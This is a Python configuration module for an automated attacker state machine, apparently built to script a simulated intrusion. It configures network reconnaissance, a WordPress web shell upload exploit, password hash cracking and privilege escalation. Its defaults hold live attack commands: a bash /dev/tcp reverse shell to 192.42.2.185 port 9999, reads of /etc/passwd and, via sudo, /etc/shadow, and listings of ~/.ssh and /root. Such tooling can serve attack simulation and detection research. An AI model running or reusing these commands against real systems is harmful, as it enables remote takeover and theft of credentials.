from datetime import (
    datetime,
    timedelta,
)
from ipaddress import (
    IPv4Address,
    IPv4Network,
)
from typing import (
    List,
    Optional,
    Pattern,
    Union,
)

from pydantic import (
    BaseModel,
    Field,
    FilePath,
    HttpUrl,
    validator,
)

from ..core.config import (
    Idle,
    IdleConfig,
)
from .expect import SH_PATTERN


class CommandConfigBase(BaseModel):
    name: str = Field(
        ...,
        description="The name to assign to the command",
    )

    idle_after: Idle = Field(
        Idle.TINY,
        description="The idle type to use for idling after executing the command.",
    )


class WebShellCMD(CommandConfigBase):

    cmd: List[str] = Field(
        ...,
        description="The shell command and arguments string",
    )

    children: List["WebShellCMD"] = Field(
        [],
        description="List of commands that can be executed after this command.",
    )


WebShellCMD.update_forward_refs()


class HostCMD(CommandConfigBase):
    cmd: str = Field(
        ...,
        description="The shell command and arguments string",
    )

    expect: Pattern = Field(
        SH_PATTERN,
        descrition="The regex pattern to wait for after executing the command.",
    )

    children: List["HostCMD"] = Field(
        [],
        description="List of commands that can be executed after this command.",
    )


HostCMD.update_forward_refs()


class NetworkReconConfig(BaseModel):
    trace_target: str = Field(
        ...,
        description="The host to traceroute to",
    )

    dmz: IPv4Network = Field(
        ...,
        description="The DMZ network to scan",
    )

    intranet: IPv4Network = Field(
        ...,
        description="The intranet network to scan",
    )

    dns: IPv4Address = Field(
        ...,
        description="The DNS server to target during the domain scan",
    )

    domain: str = Field(
        ...,
        description="The domain to brute force",
    )

    hosts: List[IPv4Address] = Field(
        ...,
        description="The hosts to target for the service scan",
    )

    service_scan_extra_args: List[str] = Field(
        [], description="Extra args of the service scan"
    )

    intranet_scan_extra_args: List[str] = Field(
        [], description="Extra args of the intranet scan"
    )

    dns_scan_extra_args: List[str] = Field([], description="Extra args of the dns scan")

    dmz_scan_extra_args: List[str] = Field([], description="Extra args of the dmz scan")


class WordpressAttackConfig(BaseModel):
    url: HttpUrl = Field(
        ...,
        description="The base URL for the wordpress instance",
    )

    admin_ajax: str = Field(
        "wp-admin/admin-ajax.php",
        description="The path to admin ajax endpoint (without leading slash).",
    )

    dirb_wordlists: List[FilePath] = Field(
        [],
        description=(
            "The wordlists to use. "
            "By default `/usr/share/dirb/wordlists/common.txt` is used."
        ),
    )

    rce_image: FilePath = Field(
        ...,
        description="The JPEG image to use to for the web shell upload exploit",
    )

    hashcrack_url: HttpUrl = Field(
        ...,
        description="The url to the hashcrack repo",
    )

    file_name: str = Field(
        ...,
        description="The name of the hashcrack tar",
    )

    wl_url: HttpUrl = Field(
        ...,
        description="The url to the host and path where the wordlist for cracking is available",
    )

    wl_name: str = Field(
        ...,
        description="The name of the wordlist",
    )

    attacked_user: str = Field(
        ...,
        description="The name of the WP user where password is cracked",
    )

    tar_download_name: str = Field(
        None,
        description="The name of the downloaded tar file",
    )

    offline_cracking_probability: float = Field(
        0.5,
        description="The probability that cracking is assumed to take place offline",
    )

    commands: List[WebShellCMD] = Field(
        [
            WebShellCMD(name="check_user_id", cmd=["id"]),
            WebShellCMD(name="check_network_config", cmd=["ip", "addr"]),
            WebShellCMD(name="check_pwd", cmd=["pwd"]),
            WebShellCMD(name="list_web_dir", cmd=["ls", "-laR", "/var/www"]),
            WebShellCMD(name="read_passwd", cmd=["cat", "/etc/passwd"]),
        ],
        description="The commands to execute via the web shell",
    )

    wordpress_extra_args: List[str] = Field(
        ["--disable-tls-checks", "--no-update"],
        description="Extra args of the wordpress scan",
    )

    dirb_extra_args: List[str] = Field(
        [],
        description="Extra args of the dirb scan",
    )

    @validator("admin_ajax")
    def no_slash(cls, v: str) -> str:
        assert (
            len(v) > 0 and v[0] != "/"
        ), "The ajax endpoint path must not start with a /"
        return v


class EscalateConfig(BaseModel):
    user: str = Field(
        ...,
        description="The user to escalate to in the 2nd part",
    )

    password: str = Field(
        ...,
        description="The password to use for escalation",
    )

    pty_expect: Pattern = Field(
        SH_PATTERN,
        description="The pattern to expect after opening the pty shell",
    )

    user_expect: Pattern = Field(
        SH_PATTERN,
        description="The pattern to expect after changing the user",
    )

    reverse_cmd: List[str] = Field(
        [
            "bash",
            "-c",
            "'0<&196;exec 196<>/dev/tcp/192.42.2.185/9999; sh <&196 >&196 2>&196'",
        ],
        description="The command to execute via the web shell to establish a reverse shell",
    )

    reverse_prompts_expect: Optional[Pattern] = Field(
        None,
        description="The prompt to expect after opening the reverse shell",
    )

    reverse_port: int = Field(
        9999,
        description="The port to bind the reverse shell to",
    )

    commands: List[HostCMD] = Field(
        [
            HostCMD(name="check_ssh_keys", cmd="ls -la ~/.ssh"),
            HostCMD(name="check_groups", cmd="groups"),
            HostCMD(
                name="check_sudo",
                cmd="sudo -l",
                children=[
                    HostCMD(name="read_shadow", cmd="sudo cat /etc/shadow"),
                    HostCMD(name="list_root", cmd="sudo ls -laR /root/"),
                ],
            ),
        ],
        description="The commands to execute via the reverse shell",
    )


def _check_delta(v: Union[timedelta, datetime]) -> Union[timedelta, datetime]:
    """Validator to check that timedeltas are positive"""
    if isinstance(v, timedelta):
        assert v.total_seconds() >= 0, "The relative time must be positive"
    return v


class StatemachineConfig(BaseModel):
    """State machine configuration model for the attacker

    Example:
        ```yaml
        max_errors: 0
        start_time: 2021-01-23T9:00
        end_time: 2021-01-29T00:01
        schedule:
        work_days:
            monday:
                start_time: 09:00
                end_time: 17:30
            friday:
                start_time: 11:21
                end_time: 19:43
        ```
    """

    attack_start_time: Union[timedelta, datetime] = Field(
        timedelta(0),
        description=(
            "The attack start time "
            "(can also be defined as timedelta relative to the current time)"
        ),
    )

    escalate_start_time: Union[timedelta, datetime] = Field(
        timedelta(0),
        description=(
            "The host user escalation start time "
            "(can also be defined as timedelta relative to the attack start time)"
        ),
    )

    idle: IdleConfig = Field(
        IdleConfig(),
        description="The idle configuration for the state machine",
    )

    vpn: FilePath = Field(
        ...,
        description="The VPN connection config to use",
    )

    recon: NetworkReconConfig = Field(
        ...,
        description="Network recon configuration",
    )

    wordpress: WordpressAttackConfig = Field(
        ...,
        description="Wordpress attack configuration",
    )

    escalate: EscalateConfig = Field(
        ...,
        description="The user escalation configuration",
    )

    _check_start_time = validator("attack_start_time", allow_reuse=True)(_check_delta)
    _check_escalate_time = validator("escalate_start_time", allow_reuse=True)(
        _check_delta
    )
